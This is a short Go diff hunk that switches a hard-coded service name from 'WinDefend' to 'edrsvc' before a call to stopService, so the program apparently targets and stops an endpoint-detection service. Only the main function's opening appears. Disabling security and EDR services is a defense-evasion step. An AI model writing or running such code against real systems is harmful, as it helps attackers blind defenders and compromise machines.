@@ -6,7 +6,7 @@ import (
 )
 
 func main() {
-	serviceName := "WinDefend" // Replace this or make it an argument
+	serviceName := "edrsvc" // Replace this or make it an argument
 
 	err := stopService(serviceName)
 	if err != nil {
